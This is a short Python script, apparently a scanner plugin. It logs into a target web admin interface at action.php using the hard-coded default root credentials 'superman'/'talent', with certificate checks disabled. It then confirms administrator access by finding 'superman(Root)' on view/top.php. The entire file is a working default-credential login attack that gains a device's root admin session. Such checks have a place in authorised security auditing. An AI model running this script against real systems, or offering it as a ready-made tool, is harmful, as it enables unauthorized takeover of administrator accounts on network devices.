import requests,re,urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
def scan(baseurl):
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	session=requests.Session()
	url=baseurl+"action.php"
	body="language=zh_CN&user_name=superman&user_password=talent&do=login"
	headers={'Content-Type': 'application/x-www-form-urlencoded'}
	response=session.post(url,body,headers=headers,timeout=5,verify=False)
	if response.status_code == 200 and "window.location = \"main.html\"" in response.text:
		r0=True
	else:
		r0=False
	if baseurl[-1]=="/":
		baseurl=baseurl
	else:
		baseurl=baseurl+"/"
	url=baseurl+"view/top.php"
	headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0"}
	response=session.get(url,headers=headers,timeout=5,verify=False)
	response.encoding='utf-8'
	if response.status_code == 200 and "<span>当前管理员" in response.text and "superman(Root)" in response.text:
		r1=True
	else:
		r1=False
	if r0 and r1:
		return True
	else:
		return False
